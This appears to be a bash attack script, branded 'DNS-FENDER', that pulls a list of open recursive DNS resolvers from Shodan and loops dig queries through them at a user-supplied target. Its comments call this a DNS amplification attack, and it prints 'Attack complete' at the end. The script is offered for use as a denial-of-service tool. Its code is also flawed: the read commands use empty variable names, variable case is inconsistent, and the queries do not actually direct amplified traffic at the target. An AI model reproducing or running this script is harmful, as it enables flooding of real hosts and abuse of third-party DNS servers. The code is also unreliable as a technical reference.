#!/bin/bash
# Banner
RED='\033[01;31m'
banner()
{

echo -e "${RED}8888888b.  888b    888  .d8888b.         8888888888 8888888888 888b    888 8888888b.  8888888888 8888888b.  
888  \"Y88b 8888b   888 d88P  Y88b        888        888        8888b   888 888  \"Y88b 888        888   Y88b 
888    888 88888b  888 Y88b.             888        888        88888b  888 888    888 888        888    888 
888    888 888Y88b 888  \"Y888b.          8888888    8888888    888Y88b 888 888    888 8888888    888   d88P 
888    888 888 Y88b888     \"Y88b.        888        888        888 Y88b888 888    888 888        8888888P\"  
888    888 888  Y88888       \"888 888888 888        888        888  Y88888 888    888 888        888 T88b   
888  .d88P 888   Y8888 Y88b  d88P        888        888        888   Y8888 888  .d88P 888        888  T88b  
8888888P\"  888    Y888  \"Y8888P\"         888        8888888888 888    Y888 8888888P\"  8888888888 888   T88b 
                                                                                                            
                                                                                                            
                                                                                                            "
tput sgr0
}
banner
# Prompt for API key and Target
read -p "Enter your Shodan API key: " $APIkey
read -p "Enter the Target IP or Website (Example: www.google.com) to attack: " $Target
# Initialize
shodan init $APIKey > /dev/null 2>&1
# Search for DNS Resolvers
shodan download DNS-Resolvers "Recursion: enabled" > /dev/null 2>&1
# Parse JSON for IP addresses
shodan parse --fields ip_str DNS-Resolvers.json.gz > /dev/null 2>&1 > DNS-Resolvers.txt
rm DNS-Resolvers.json.gz
# Read from file and issue DNS amplification attack
echo -ne '#####                     (31%)\r'
sleep 4
while read line;
do 
dig $Target @$line > /dev/null 2>&1
done < DNS-Resolvers.txt
rm DNS-Resolvers.txt
echo -ne '#############             (62%)\r'
sleep 5
echo -ne '#######################   (100%)\r'
echo -ne '\n'
echo "Attack complete"
